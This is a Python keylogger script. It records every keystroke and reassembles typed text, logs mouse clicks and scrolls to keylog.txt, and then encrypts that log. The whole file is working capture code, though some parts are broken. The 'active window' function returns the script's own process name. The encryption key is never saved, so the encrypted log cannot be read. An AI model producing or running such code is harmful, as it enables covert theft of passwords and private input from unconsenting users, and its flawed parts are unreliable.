import psutil
import os
from pynput import keyboard, mouse
import logging
import time
from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Configure logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def get_active_window_process_name():
    active_window = psutil.Process(os.getpid())
    return active_window.name()

# Initialize a variable to store the current text input
current_text = []

def on_press(key):
    try:
        app_name = get_active_window_process_name()
        logging.info(f"Key pressed: {key.char} in {app_name}")
    except AttributeError:
        logging.info(f"Special key pressed: {key} in {app_name}")

def on_release(key):
    global current_text
    app_name = get_active_window_process_name()
    if hasattr(key, 'char') and key.char is not None:
        current_text.append(key.char)
    elif key == keyboard.Key.space:
        current_text.append(' ')
    elif key == keyboard.Key.enter:
        current_text.append('\n')

    if key == keyboard.Key.space or key == keyboard.Key.enter:
        logging.info(f"Text input: {''.join(current_text)} in {app_name}")
        current_text = []

    logging.info(f"Key released: {key} in {app_name}")
    if key == keyboard.Key.esc:
        return False

def on_click(x, y, button, pressed):
    app_name = get_active_window_process_name()
    if pressed:
        logging.info(f"Mouse clicked at ({x}, {y}) with {button} in {app_name}")
    else:
        logging.info(f"Mouse released at ({x}, {y}) with {button} in {app_name}")

def on_scroll(x, y, dx, dy):
    app_name = get_active_window_process_name()
    logging.info(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy}) in {app_name}")

def stop_listeners():
    keyboard_listener.stop()
    mouse_listener.stop()

def on_key_combination(key):
    if key == keyboard.KeyCode.from_char('\x03'):  # Ctrl + C
        stop_listeners()
        return False

# Set up the keyboard listener
keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
keyboard_listener.start()

# Set up the mouse listener
mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
mouse_listener.start()

# Set up the key combination listener
key_combination_listener = keyboard.Listener(on_press=on_key_combination)
key_combination_listener.start()

keyboard_listener.join()
mouse_listener.join()
key_combination_listener.join()

# Encrypt the log file
with open("keylog.txt", "rb") as file:
    log_data = file.read()

encrypted_data = cipher_suite.encrypt(log_data)

with open("keylog.enc", "wb") as file:
    file.write(encrypted_data)